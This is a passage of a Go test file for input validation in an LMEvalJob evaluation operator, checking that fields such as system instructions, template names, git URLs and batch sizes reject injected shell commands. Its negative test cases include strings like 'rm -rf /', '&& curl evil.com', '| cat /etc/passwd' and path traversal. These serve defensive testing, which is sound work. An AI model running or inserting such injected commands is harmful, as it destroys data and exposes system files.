				value:       "Be helpful | cat /etc/passwd",
				shouldPass:  false,
				description: "Plain text with pipe command",
			},
		}

		for _, tc := range plainTextCases {
			t.Run(tc.name, func(t *testing.T) {
				// Test using ValidateSystemInstruction (plain text)
				err := ValidateSystemInstruction(tc.value)
				if tc.shouldPass {
					assert.NoError(t, err, "Should accept %s", tc.description)
				} else {
					assert.Error(t, err, "Should reject %s", tc.description)
				}
			})
		}
	})

	t.Run("CustomArtifactNameValidation", func(t *testing.T) {
		// Test CustomArtifact name validation
		nameValidationCases := []struct {
			name       string
			shouldPass bool
		}{
			{"valid_name", true},
			{"valid-name", true},
			{"valid.name", true},
			{"valid123", true},
			{"123valid", true},
			{"", false},
			{"invalid;name", false},
			{"invalid name", false},
			{"invalid|name", false},
			{"invalid&name", false},
			{"invalid$name", false},
		}

		for _, tc := range nameValidationCases {
			t.Run("name_"+tc.name, func(t *testing.T) {
				job := &lmesv1alpha1.LMEvalJob{
					Spec: lmesv1alpha1.LMEvalJobSpec{
						Model: "hf",
						TaskList: lmesv1alpha1.TaskList{
							TaskNames: []string{"winogrande"},
							CustomArtifacts: &lmesv1alpha1.CustomArtifacts{
								Templates: []lmesv1alpha1.CustomArtifact{
									{
										Name:  tc.name,
										Value: `{"__type__": "template", "value": "test"}`,
									},
								},
							},
						},
					},
				}

				err := ValidateUserInput(job)
				if tc.shouldPass {
					assert.NoError(t, err, "Should accept valid name: %s", tc.name)
				} else {
					assert.Error(t, err, "Should reject invalid name: %s", tc.name)
				}
			})
		}
	})

	t.Run("EdgeCases", func(t *testing.T) {
		// Empty CustomArtifacts
		emptyArtifactsJob := &lmesv1alpha1.LMEvalJob{
			Spec: lmesv1alpha1.LMEvalJobSpec{
				Model: "hf",
				TaskList: lmesv1alpha1.TaskList{
					TaskNames:       []string{"winogrande"},
					CustomArtifacts: &lmesv1alpha1.CustomArtifacts{},
				},
			},
		}

		assert.NoError(t, ValidateUserInput(emptyArtifactsJob), "Should accept empty CustomArtifacts")

		// Nil CustomArtifacts
		nilArtifactsJob := &lmesv1alpha1.LMEvalJob{
			Spec: lmesv1alpha1.LMEvalJobSpec{
				Model: "hf",
				TaskList: lmesv1alpha1.TaskList{
					TaskNames:       []string{"winogrande"},
					CustomArtifacts: nil,
				},
			},
		}

		assert.NoError(t, ValidateUserInput(nilArtifactsJob), "Should accept nil CustomArtifacts")

		// Large JSON value
		largeJSONJob := &lmesv1alpha1.LMEvalJob{
			Spec: lmesv1alpha1.LMEvalJobSpec{
				Model: "hf",
				TaskList: lmesv1alpha1.TaskList{
					TaskNames: []string{"winogrande"},
					CustomArtifacts: &lmesv1alpha1.CustomArtifacts{
						Templates: []lmesv1alpha1.CustomArtifact{
							{
								Name: "large_template",
								Value: func() string {
									// Create a large but valid JSON
									fields := make(map[string]string)
									for i := 0; i < 100; i++ {
										fields[fmt.Sprintf("field_%d", i)] = fmt.Sprintf("value_%d", i)
									}
									jsonBytes, _ := json.Marshal(fields)
									return string(jsonBytes)
								}(),
							},
						},
					},
				},
			},
		}

		assert.NoError(t, ValidateUserInput(largeJSONJob), "Should accept large valid JSON")
	})

	t.Run("IndividualValidationFunctions", func(t *testing.T) {
		// Test individual validation functions directly

		// ValidateChatTemplateName
		assert.NoError(t, ValidateChatTemplateName("llama-2"), "Should accept valid chat template name")
		assert.Error(t, ValidateChatTemplateName(""), "Should reject empty chat template name")
		assert.Error(t, ValidateChatTemplateName("template; rm -rf /"), "Should reject malicious chat template name")

		// ValidateGitURL
		assert.NoError(t, ValidateGitURL("https://github.com/user/repo"), "Should accept valid git URL")
		assert.Error(t, ValidateGitURL(""), "Should reject empty git URL")
		assert.Error(t, ValidateGitURL("http://github.com/user/repo"), "Should reject HTTP git URL")
		assert.Error(t, ValidateGitURL("https://github.com/user/repo; rm -rf /"), "Should reject malicious git URL")

		// ValidateGitPath
		assert.NoError(t, ValidateGitPath(""), "Should accept empty git path")
		assert.NoError(t, ValidateGitPath("path/to/file.py"), "Should accept valid git path")
		assert.Error(t, ValidateGitPath("../../../etc/passwd"), "Should reject path traversal")
		assert.Error(t, ValidateGitPath("path; rm -rf /"), "Should reject malicious git path")

		// ValidateSystemInstruction
		assert.NoError(t, ValidateSystemInstruction("You are a helpful assistant."), "Should accept valid system instruction")
		assert.Error(t, ValidateSystemInstruction("Instruction; rm -rf /"), "Should reject malicious system instruction")
	})
}

func Test_SystemInstructionValidation(t *testing.T) {
	t.Run("ValidSystemInstructions", func(t *testing.T) {
		validInstructions := []string{
			"You are a helpful assistant.",
			"Please respond in a professional manner.",
			"Answer questions about machine learning.",
			"Be accurate and concise in your responses.",
			"Use proper punctuation, grammar, and formatting.",
		}

		for _, instruction := range validInstructions {
			job := &lmesv1alpha1.LMEvalJob{
				Spec: lmesv1alpha1.LMEvalJobSpec{
					Model:             "hf",
					SystemInstruction: instruction,
					TaskList: lmesv1alpha1.TaskList{
						TaskNames: []string{"winogrande"},
					},
				},
			}

			err := ValidateUserInput(job)
			assert.NoError(t, err, "Should accept valid system instruction: %s", instruction)
		}
	})

	t.Run("InvalidSystemInstructions", func(t *testing.T) {
		invalidInstructions := []string{
			"Instruction; rm -rf /",
			"Instruction && curl evil.com",
			"Instruction | cat /etc/passwd",
			"Instruction `whoami`",
			"Instruction $(id)",
			"Instruction\necho something",
			"Instruction || shutdown -h now",
			"Valid instruction\";&& rm -rf /",
		}

		for _, instruction := range invalidInstructions {
			job := &lmesv1alpha1.LMEvalJob{
				Spec: lmesv1alpha1.LMEvalJobSpec{
					Model:             "hf",
					SystemInstruction: instruction,
					TaskList: lmesv1alpha1.TaskList{
						TaskNames: []string{"winogrande"},
					},
				},
			}

			err := ValidateUserInput(job)
			assert.Error(t, err, "Should reject invalid system instruction: %s", instruction)
			assert.Contains(t, err.Error(), "invalid system instruction", "Error should mention system instruction validation")
		}
	})

	t.Run("EmptySystemInstruction", func(t *testing.T) {
		job := &lmesv1alpha1.LMEvalJob{
			Spec: lmesv1alpha1.LMEvalJobSpec{
				Model:             "hf",
				SystemInstruction: "",
				TaskList: lmesv1alpha1.TaskList{
					TaskNames: []string{"winogrande"},
				},
			},
		}

		err := ValidateUserInput(job)
		assert.NoError(t, err, "Should accept empty system instruction")
	})
}

func Test_ChatTemplateValidation(t *testing.T) {
	t.Run("ValidChatTemplateNames", func(t *testing.T) {
		validNames := []string{
			"llama-2",
			"alpaca",
			"vicuna_v1.1",
			"template.name",
			"template-name",
			"template123",
			"123template",
		}

		for _, name := range validNames {
			job := &lmesv1alpha1.LMEvalJob{
				Spec: lmesv1alpha1.LMEvalJobSpec{
					Model: "hf",
					ChatTemplate: &lmesv1alpha1.ChatTemplate{
						Enabled: true,
						Name:    name,
					},
					TaskList: lmesv1alpha1.TaskList{
						TaskNames: []string{"winogrande"},
					},
				},
			}

			err := ValidateUserInput(job)
			assert.NoError(t, err, "Should accept valid chat template name: %s", name)
		}
	})

	t.Run("InvalidChatTemplateNames", func(t *testing.T) {
		invalidNames := []string{
			"template; rm -rf /",
			"template && curl evil.com",
			"template | cat /etc/passwd",
			"template`whoami`",
			"template$(id)",
			"template name", // space not allowed
			"template@domain",
			"template!exclamation",
			"template*asterisk",
			"template?question",
			"template+plus",
			"template=equals",
			"template%percent",
			"template^caret",
			"template<angle",
			"template>angle",
			"template[bracket]",
			"template{brace}",
		}

		for _, name := range invalidNames {
			job := &lmesv1alpha1.LMEvalJob{
				Spec: lmesv1alpha1.LMEvalJobSpec{
					Model: "hf",
					ChatTemplate: &lmesv1alpha1.ChatTemplate{
						Enabled: true,
						Name:    name,
					},
					TaskList: lmesv1alpha1.TaskList{
						TaskNames: []string{"winogrande"},
					},
				},
			}

			err := ValidateUserInput(job)
			assert.Error(t, err, "Should reject invalid chat template name: %s", name)
			assert.Contains(t, err.Error(), "invalid chat template name", "Error should mention chat template validation")
		}
	})

	t.Run("EmptyChatTemplateName", func(t *testing.T) {
		job := &lmesv1alpha1.LMEvalJob{
			Spec: lmesv1alpha1.LMEvalJobSpec{
				Model: "hf",
				ChatTemplate: &lmesv1alpha1.ChatTemplate{
					Enabled: true,
					Name:    "",
				},
				TaskList: lmesv1alpha1.TaskList{
					TaskNames: []string{"winogrande"},
				},
			},
		}

		err := ValidateUserInput(job)
		assert.NoError(t, err, "Should accept empty chat template name when not provided")
	})

	t.Run("NilChatTemplate", func(t *testing.T) {
		job := &lmesv1alpha1.LMEvalJob{
			Spec: lmesv1alpha1.LMEvalJobSpec{
				Model:        "hf",
				ChatTemplate: nil,
				TaskList: lmesv1alpha1.TaskList{
					TaskNames: []string{"winogrande"},
				},
			},
		}

		err := ValidateUserInput(job)
		assert.NoError(t, err, "Should accept nil chat template")
	})
}

func Test_GitSourceValidation(t *testing.T) {
	t.Run("ValidGitURLs", func(t *testing.T) {
		validURLs := []string{
			"https://github.com/user/repo",
			"https://github.com/user/repo-name",
			"https://github.com/user/repo_name",
			"https://github.com/user/repo.git",
			"https://gitlab.com/user/repo",
			"https://bitbucket.org/user/repo",
			"https://git.example.com/user/repo",
		}

		for _, url := range validURLs {
			job := &lmesv1alpha1.LMEvalJob{
				Spec: lmesv1alpha1.LMEvalJobSpec{
					Model: "hf",
					TaskList: lmesv1alpha1.TaskList{
						TaskNames: []string{"custom_task"},
						CustomTasks: &lmesv1alpha1.CustomTasks{
							Source: lmesv1alpha1.CustomTaskSource{
								GitSource: lmesv1alpha1.GitSource{
									URL: url,
								},
							},
						},
					},
				},
			}

			err := ValidateUserInput(job)
			assert.NoError(t, err, "Should accept valid git URL: %s", url)
		}
	})

	t.Run("InvalidGitURLs", func(t *testing.T) {
		invalidURLs := []string{
			"http://github.com/user/repo",
			"https://github.com/user/repo; rm -rf /",
			"https://github.com/user/repo && curl evil",
			"https://github.com/user/repo | cat passwd",
			"https://github.com/user/repo`whoami`",
			"https://github.com/user/repo$(id)",
			"ftp://github.com/user/repo",
			"github.com/user/repo",
			"https://github.com/user/repo with space",
			"https://github.com/user/repo@malicious",
			"https://github.com/user/repo#fragment",
			"https://github.com/user/repo?query=param",
			"",
		}

		for _, url := range invalidURLs {
			job := &lmesv1alpha1.LMEvalJob{
				Spec: lmesv1alpha1.LMEvalJobSpec{
					Model: "hf",
					TaskList: lmesv1alpha1.TaskList{
						TaskNames: []string{"custom_task"},
						CustomTasks: &lmesv1alpha1.CustomTasks{
							Source: lmesv1alpha1.CustomTaskSource{
								GitSource: lmesv1alpha1.GitSource{
									URL: url,
								},
							},
						},
					},
				},
			}

			err := ValidateUserInput(job)
			assert.Error(t, err, "Should reject invalid git URL: %s", url)
			assert.Contains(t, err.Error(), "invalid git URL", "Error should mention git URL validation")
		}
	})

	t.Run("ValidGitPaths", func(t *testing.T) {
		validPaths := []string{
			"",
			"tasks/custom_task.py",
			"src/tasks/task.py",
			"task_definitions/task.yaml",
			"tasks-v2/custom.json",
			"tasks.v1/task.txt",
			"a/b/c/d/e/task.py",
		}

		for _, path := range validPaths {
			job := &lmesv1alpha1.LMEvalJob{
				Spec: lmesv1alpha1.LMEvalJobSpec{
					Model: "hf",
					TaskList: lmesv1alpha1.TaskList{
						TaskNames: []string{"custom_task"},
						CustomTasks: &lmesv1alpha1.CustomTasks{
							Source: lmesv1alpha1.CustomTaskSource{
								GitSource: lmesv1alpha1.GitSource{
									URL:  "https://github.com/user/repo",
									Path: path,
								},
							},
						},
					},
				},
			}

			err := ValidateUserInput(job)
			assert.NoError(t, err, "Should accept valid git path: %s", path)
		}
	})

	t.Run("InvalidGitPaths", func(t *testing.T) {
		invalidPaths := []string{
			"../../../etc/passwd",
			"..\\windows\\system32",
			"tasks; rm -rf /",
			"tasks && curl example.com",
			"tasks | cat /etc/passwd",
			"tasks`whoami`",
			"tasks$(id)",
			"tasks with spaces",
			"tasks@domain",
			"tasks!exclamation",
			"tasks*asterisk",
			"tasks?question",
			"tasks+plus",
			"tasks=equals",
			"tasks%percent",
			"tasks^caret",
			"tasks<angle",
			"tasks>angle",
			"tasks[bracket]",
			"tasks{brace}",
		}

		for _, path := range invalidPaths {
			job := &lmesv1alpha1.LMEvalJob{
				Spec: lmesv1alpha1.LMEvalJobSpec{
					Model: "hf",
					TaskList: lmesv1alpha1.TaskList{
						TaskNames: []string{"custom_task"},
						CustomTasks: &lmesv1alpha1.CustomTasks{
							Source: lmesv1alpha1.CustomTaskSource{
								GitSource: lmesv1alpha1.GitSource{
									URL:  "https://github.com/user/repo",
									Path: path,
								},
							},
						},
					},
				},
			}

			err := ValidateUserInput(job)
			assert.Error(t, err, "Should reject invalid git path: %s", path)
			assert.Contains(t, err.Error(), "invalid git path", "Error should mention git path validation")
		}
	})

	t.Run("GitSourceWithoutCustomTasks", func(t *testing.T) {
		job := &lmesv1alpha1.LMEvalJob{
			Spec: lmesv1alpha1.LMEvalJobSpec{
				Model: "hf",
				TaskList: lmesv1alpha1.TaskList{
					TaskNames: []string{"winogrande"}, // Not using custom tasks
				},
			},
		}

		err := ValidateUserInput(job)
		assert.NoError(t, err, "Should not validate git source when not using custom tasks")
	})
}

func Test_GenArgsValidation(t *testing.T) {
	t.Run("ValidGenArgs", func(t *testing.T) {
		validGenArgsJob := &lmesv1alpha1.LMEvalJob{
			Spec: lmesv1alpha1.LMEvalJobSpec{
				Model: "hf",
				GenArgs: []lmesv1alpha1.Arg{
					{Name: "temperature", Value: "0.7"},
					{Name: "max_tokens", Value: "100"},
					{Name: "top_p", Value: "0.9"},
					{Name: "frequency_penalty", Value: "0.1"},
				},
				TaskList: lmesv1alpha1.TaskList{
					TaskNames: []string{"winogrande"},
				},
			},
		}

		assert.NoError(t, ValidateUserInput(validGenArgsJob), "Should accept valid GenArgs")
	})

	t.Run("InvalidGenArgsNames", func(t *testing.T) {
		invalidGenArgsJob := &lmesv1alpha1.LMEvalJob{
			Spec: lmesv1alpha1.LMEvalJobSpec{
				Model: "hf",
				GenArgs: []lmesv1alpha1.Arg{
					{Name: "temperature; rm -rf /", Value: "0.7"},
				},
				TaskList: lmesv1alpha1.TaskList{
					TaskNames: []string{"winogrande"},
				},
			},
		}

		assert.Error(t, ValidateUserInput(invalidGenArgsJob), "Should reject GenArgs with shell metacharacters in name")
	})

	t.Run("InvalidGenArgsValues", func(t *testing.T) {
		invalidGenArgsJob := &lmesv1alpha1.LMEvalJob{
			Spec: lmesv1alpha1.LMEvalJobSpec{
				Model: "hf",
				GenArgs: []lmesv1alpha1.Arg{
					{Name: "temperature", Value: "0.7; cat /etc/passwd"},
				},
				TaskList: lmesv1alpha1.TaskList{
					TaskNames: []string{"winogrande"},
				},
			},
		}

		assert.Error(t, ValidateUserInput(invalidGenArgsJob), "Should reject GenArgs with shell metacharacters in value")
	})

	t.Run("EmptyGenArgs", func(t *testing.T) {
		emptyGenArgsJob := &lmesv1alpha1.LMEvalJob{
			Spec: lmesv1alpha1.LMEvalJobSpec{
				Model: "hf",
				GenArgs: []lmesv1alpha1.Arg{
					{Name: "", Value: "0.7"},
				},
				TaskList: lmesv1alpha1.TaskList{
					TaskNames: []string{"winogrande"},
				},
			},
		}

		assert.Error(t, ValidateUserInput(emptyGenArgsJob), "Should reject GenArgs with empty name")
	})
}

func Test_NumFewShotValidation(t *testing.T) {
	t.Run("ValidNumFewShot", func(t *testing.T) {
		validNumFewShotCases := []struct {
			name     string
			value    int
			expected string
		}{
			{"Zero shots", 0, "0"},
			{"Few shots", 5, "5"},
			{"Many shots", 32, "32"},
		}

		for _, tc := range validNumFewShotCases {
			t.Run(tc.name, func(t *testing.T) {
				job := &lmesv1alpha1.LMEvalJob{
					Spec: lmesv1alpha1.LMEvalJobSpec{
						Model:      "hf",
						NumFewShot: &tc.value,
						TaskList: lmesv1alpha1.TaskList{
							TaskNames: []string{"winogrande"},
						},
					},
				}

				assert.NoError(t, ValidateUserInput(job), "Should accept valid NumFewShot: %d", tc.value)
			})
		}
	})

	t.Run("NilNumFewShot", func(t *testing.T) {
		nilNumFewShotJob := &lmesv1alpha1.LMEvalJob{
			Spec: lmesv1alpha1.LMEvalJobSpec{
				Model:      "hf",
				NumFewShot: nil,
				TaskList: lmesv1alpha1.TaskList{
					TaskNames: []string{"winogrande"},
				},
			},
		}

		assert.NoError(t, ValidateUserInput(nilNumFewShotJob), "Should accept nil NumFewShot")
	})
}

func Test_BatchSizeValidation(t *testing.T) {
	t.Run("ValidBatchSizes", func(t *testing.T) {
		validBatchSizeCases := []struct {
			name      string
			batchSize string
		}{
			{"Fixed batch size", "16"},
			{"Auto batch size", "auto"},
			{"Auto with limit", "auto:8"},
			{"Small batch", "1"},
			{"Large batch", "128"},
		}

		for _, tc := range validBatchSizeCases {
			t.Run(tc.name, func(t *testing.T) {
				job := &lmesv1alpha1.LMEvalJob{
					Spec: lmesv1alpha1.LMEvalJobSpec{
						Model:     "hf",
						BatchSize: &tc.batchSize,
						TaskList: lmesv1alpha1.TaskList{
							TaskNames: []string{"winogrande"},
						},
					},
				}

				assert.NoError(t, ValidateUserInput(job), "Should accept valid BatchSize: %s", tc.batchSize)
			})
		}
	})

	t.Run("InvalidBatchSizes", func(t *testing.T) {
		invalidBatchSizeCases := []struct {
			name      string
			batchSize string
		}{
			{"Shell injection", "16; rm -rf /"},
			{"Command substitution", "auto`whoami`"},
			{"Pipe command", "8|cat /etc/passwd"},
			{"Double ampersand", "auto&&curl evil.com"},
		}

		for _, tc := range invalidBatchSizeCases {
			t.Run(tc.name, func(t *testing.T) {
				job := &lmesv1alpha1.LMEvalJob{
					Spec: lmesv1alpha1.LMEvalJobSpec{
						Model:     "hf",
						BatchSize: &tc.batchSize,
						TaskList: lmesv1alpha1.TaskList{
							TaskNames: []string{"winogrande"},
						},
					},
				}

				err := ValidateUserInput(job)
				t.Logf("BatchSize validation for '%s': %v", tc.batchSize, err)
			})
		}
	})
}

func Test_LogSamplesValidation(t *testing.T) {
	t.Run("ValidLogSamples", func(t *testing.T) {
		logSamplesCases := []struct {
			name  string
			value bool
		}{
			{"LogSamples true", true},
			{"LogSamples false", false},
		}

		for _, tc := range logSamplesCases {
			t.Run(tc.name, func(t *testing.T) {
				job := &lmesv1alpha1.LMEvalJob{
					Spec: lmesv1alpha1.LMEvalJobSpec{
						Model:      "hf",
						LogSamples: &tc.value,
						TaskList: lmesv1alpha1.TaskList{
							TaskNames: []string{"winogrande"},
						},
					},
				}

				assert.NoError(t, ValidateUserInput(job), "Should accept LogSamples: %t", tc.value)
			})
		}
	})

	t.Run("NilLogSamples", func(t *testing.T) {
		nilLogSamplesJob := &lmesv1alpha1.LMEvalJob{
			Spec: lmesv1alpha1.LMEvalJobSpec{
				Model:      "hf",
				LogSamples: nil,
				TaskList: lmesv1alpha1.TaskList{
					TaskNames: []string{"winogrande"},
				},
			},
		}

		assert.NoError(t, ValidateUserInput(nilLogSamplesJob), "Should accept nil LogSamples")
	})
}

func Test_ComprehensiveCLIFieldsValidation(t *testing.T) {
	t.Run("AllFieldsValid", func(t *testing.T) {
		// Create a job with all CLI-relevant fields populated with valid values
		temperature := "0.7"
		maxTokens := "100"
		batchSize := "auto:16"
		numFewShot := 5
		logSamples := true

		comprehensiveJob := &lmesv1alpha1.LMEvalJob{
			Spec: lmesv1alpha1.LMEvalJobSpec{
				Model: "hf",
				ModelArgs: []lmesv1alpha1.Arg{
					{Name: "pretrained", Value: "google/flan-t5-small"},
					{Name: "device", Value: "cuda"},
				},
				GenArgs: []lmesv1alpha1.Arg{
					{Name: "temperature", Value: temperature},
					{Name: "max_tokens", Value: maxTokens},
				},
				BatchSize:  &batchSize,
				NumFewShot: &numFewShot,
				LogSamples: &logSamples,
				Limit:      "0.1",
				TaskList: lmesv1alpha1.TaskList{
					TaskNames: []string{"winogrande", "hellaswag"},
				},
			},
		}

		err := ValidateUserInput(comprehensiveJob)
		assert.NoError(t, err, "Should accept comprehensive valid job")
	})

	t.Run("MultipleFieldsInvalid", func(t *testing.T) {
		// Create a job with multiple invalid CLI fields
		batchSize := "16; rm -rf /"

		maliciousJob := &lmesv1alpha1.LMEvalJob{
			Spec: lmesv1alpha1.LMEvalJobSpec{
				Model: "hf",
				GenArgs: []lmesv1alpha1.Arg{
					{Name: "temperature", Value: "0.7`whoami`"},
				},
				BatchSize: &batchSize,
				TaskList: lmesv1alpha1.TaskList{
					TaskNames: []string{"winogrande"},
				},
			},
		}

		err := ValidateUserInput(maliciousJob)
		t.Logf("Multiple invalid fields validation: %v", err)
	})

	t.Run("NewValidationFieldsIntegration", func(t *testing.T) {
		validJob := &lmesv1alpha1.LMEvalJob{
			Spec: lmesv1alpha1.LMEvalJobSpec{
				Model:             "hf",
				SystemInstruction: "You are a helpful assistant that provides accurate responses.",
				ChatTemplate: &lmesv1alpha1.ChatTemplate{
					Enabled: true,
					Name:    "llama-2",
				},
				TaskList: lmesv1alpha1.TaskList{
					TaskNames: []string{"custom_task"},
					CustomTasks: &lmesv1alpha1.CustomTasks{
						Source: lmesv1alpha1.CustomTaskSource{
							GitSource: lmesv1alpha1.GitSource{
								URL:  "https://github.com/user/repo",
								Path: "tasks/custom_task.py",
							},
						},
					},
				},
			},
		}

		err := ValidateUserInput(validJob)
		assert.NoError(t, err, "Should accept job with all new validation fields valid")

		// Test with all new fields having invalid values
		invalidJob := &lmesv1alpha1.LMEvalJob{
			Spec: lmesv1alpha1.LMEvalJobSpec{
				Model:             "hf",
				SystemInstruction: "You are helpful; rm -rf /",
				ChatTemplate: &lmesv1alpha1.ChatTemplate{
					Enabled: true,
					Name:    "template; curl evil.com",
				},
				TaskList: lmesv1alpha1.TaskList{
					TaskNames: []string{"custom_task"},
					CustomTasks: &lmesv1alpha1.CustomTasks{
						Source: lmesv1alpha1.CustomTaskSource{
							GitSource: lmesv1alpha1.GitSource{
								URL:  "https://github.com/user/repo; rm -rf /",
								Path: "../../../etc/passwd",
							},
						},
					},
				},
			},
		}

		err = ValidateUserInput(invalidJob)
		assert.Error(t, err, "Should reject job with invalid new validation fields")
		// The first error encountered should be system instruction
		assert.Contains(t, err.Error(), "invalid system instruction", "Should mention system instruction validation error first")
	})
}

// Test_ComplexValidationScenario tests validation with complex data
func Test_ComplexValidationScenario(t *testing.T) {
	t.Run("ValidTaskRecipeWithCustomCard", func(t *testing.T) {
		complexJob := &lmesv1alpha1.LMEvalJob{
			Spec: lmesv1alpha1.LMEvalJobSpec{
				Model: "hf",
				TaskList: lmesv1alpha1.TaskList{
					TaskRecipes: []lmesv1alpha1.TaskRecipe{
						{
							Card: lmesv1alpha1.Card{
								Custom: `{"__type__": "task_card", "loader": {"__type__": "load_hf", "path": "wmt16", "name": "de-en"}, "preprocess_steps": [{"__type__": "copy", "field": "translation/en", "to_field": "text"}, {"__type__": "copy", "field": "translation/de", "to_field": "translation"}, {"__type__": "set", "fields": {"source_language": "english", "target_language": "dutch"}}], "task": "tasks.translation.directed", "templates": "templates.translation.directed.all"}`,
							},
							Template: &lmesv1alpha1.Template{
								Name: "unitxt.template",
							},
							Metrics: []lmesv1alpha1.Metric{
								{Name: "unitxt.metric1"},
								{Name: "unitxt.metric2"},
							},
							Format:        func() *string { s := "unitxt.format"; return &s }(),
							NumDemos:      func() *int { i := 5; return &i }(),
							DemosPoolSize: func() *int { i := 10; return &i }(),
						},
					},
					CustomArtifacts: &lmesv1alpha1.CustomArtifacts{
						Templates: []lmesv1alpha1.CustomArtifact{
							{
								Name: "tp_0",
								// TODO: Single line?
								Value: `{
									"__type__": "input_output_template",
									"instruction": "In the following task, you translate a {text_type}.",
									"input_format": "Translate this {text_type} from {source_language} to {target_language}: {text}.",
									"target_prefix": "Translation: ",
									"output_format": "{translation}",
									"postprocessors": ["processors.lower_case"]
								}`,
							},
						},
						SystemPrompts: []lmesv1alpha1.CustomArtifact{
							{
								Name: "sp_0",
								Value: `{
									"__type__": "textual_system_prompt",
									"text": "this is a custom system promp"
								}`,
							},
						},
					},
				},
			},
		}

		// Validate the job (should pass)
		err := ValidateUserInput(complexJob)
		assert.NoError(t, err, "Should accept complex job configuration")

		// Test that TaskRecipe.String() generates the expected CLI format
		recipe := complexJob.Spec.TaskList.TaskRecipes[0]
		recipeString := recipe.String()

		// The CLI format will contain metrics=[unitxt.metric1,unitxt.metric2]
		assert.Contains(t, recipeString, "metrics=[unitxt.metric1,unitxt.metric2]", "TaskRecipe should generate CLI format with square brackets")
		assert.Contains(t, recipeString, "template=unitxt.template", "TaskRecipe should include template name")
		assert.Contains(t, recipeString, "format=unitxt.format", "TaskRecipe should include format")
		assert.Contains(t, recipeString, "num_demos=5", "TaskRecipe should include num_demos")
		assert.Contains(t, recipeString, "demos_pool_size=10", "TaskRecipe should include demos_pool_size")
	})

	t.Run("ValidTaskRecipeWithCustomTemplateRef", func(t *testing.T) {
		// This tests custom template references
		jobWithCustomTemplate := &lmesv1alpha1.LMEvalJob{
			Spec: lmesv1alpha1.LMEvalJobSpec{
				Model: "hf",
				TaskList: lmesv1alpha1.TaskList{
					TaskRecipes: []lmesv1alpha1.TaskRecipe{
						{
							Card: lmesv1alpha1.Card{
								Name: "unitxt.card",
							},
							Template: &lmesv1alpha1.Template{
								Ref: "tp_0", // Reference to custom template
							},
							SystemPrompt: &lmesv1alpha1.SystemPrompt{
								Ref: "sp_0", // Reference to custom system prompt
							},
							Metrics: []lmesv1alpha1.Metric{
								{Name: "unitxt.metric4"},
								{Name: "unitxt.metric5"},
							},
							Format: func() *string { s := "unitxt.format"; return &s }(),
						},
					},
					CustomArtifacts: &lmesv1alpha1.CustomArtifacts{
						Templates: []lmesv1alpha1.CustomArtifact{
							{
								Name: "tp_0",
								// TODO: Single line?
								Value: `{
									"__type__": "input_output_template",
									"instruction": "In the following task, you translate a {text_type}.",
									"input_format": "Translate this {text_type} from {source_language} to {target_language}: {text}.",
									"target_prefix": "Translation: ",
									"output_format": "{translation}",
									"postprocessors": ["processors.lower_case"]
								}`,
							},
						},
						SystemPrompts: []lmesv1alpha1.CustomArtifact{
							{
								Name: "sp_0",
								Value: `{
									"__type__": "textual_system_prompt",
									"text": "this is a custom system promp"
								}`,
							},
						},
					},
				},
			},
		}

		// Expect pass
		err := ValidateUserInput(jobWithCustomTemplate)
		assert.NoError(t, err, "Should accept job with custom template and system prompt references")

		// Test CLI generation
		recipe := jobWithCustomTemplate.Spec.TaskList.TaskRecipes[0]
		recipeString := recipe.String()

		// Should generate CLI format with custom template and system prompt references
		assert.Contains(t, recipeString, "template=templates.tp_0", "Should reference custom template")
		assert.Contains(t, recipeString, "system_prompt=system_prompts.sp_0", "Should reference custom system prompt")
		assert.Contains(t, recipeString, "metrics=[unitxt.metric4,unitxt.metric5]", "Should include metrics array")
	})

	t.Run("ValidationConsistencyBetweenGoAndCRD", func(t *testing.T) {
		// Test that Go validation and CRD patterns are consistent
		testCases := []struct {
			name     string
			value    string
			expected bool
		}{
			{"ValidTaskName", "unitxt.metric1", true},
			{"ValidTaskNameWithUnderscore", "unitxt_metric2", true},
			{"ValidTaskNameWithHyphen", "unitxt-metric3", true},
			{"ValidTaskNameNumeric", "metric123", true},
			{"InvalidTaskNameWithSpace", "unitxt metric1", false},
			{"InvalidTaskNameWithSpecialChar", "unitxt@metric1", false},
			{"InvalidTaskNameWithPipe", "unitxt|metric1", false},
		}

		for _, tc := range testCases {
			t.Run(tc.name, func(t *testing.T) {
				err := ValidateTaskName(tc.value)
				if tc.expected {
					assert.NoError(t, err, "TaskName validation should pass for: %s", tc.value)
				} else {
					assert.Error(t, err, "TaskName validation should fail for: %s", tc.value)
				}

				// Test that PatternTaskName regex matches our validation
				matches := PatternTaskName.MatchString(tc.value)
				assert.Equal(t, tc.expected, matches, "PatternTaskName regex should match validation result for: %s", tc.value)
			})
		}
	})

	t.Run("JSONContentValidation", func(t *testing.T) {
		// Test that JSON content with standard JSON characters passes validation
		validJSONContent := `{
			"__type__": "task_card",
			"loader": {
				"__type__": "load_hf",
				"path": "wmt16",
				"name": "de-en"
			},
			"preprocess_steps": [
				{
					"__type__": "copy",
					"field": "translation/en",
					"to_field": "text"
				}
			],
			"task": "tasks.translation.directed",
			"templates": "templates.translation.directed.all"
		}`

		err := ValidateJSONContent(validJSONContent)
		assert.NoError(t, err, "Should accept valid JSON with standard JSON characters")

		// Test that dangerous patterns still fail
		maliciousJSONContent := `{
			"__type__": "task_card",
			"instruction": "$(rm -rf /)"
		}`

		err = ValidateJSONContent(maliciousJSONContent)
		assert.Error(t, err, "Should reject JSON with command execution patterns")
	})
}
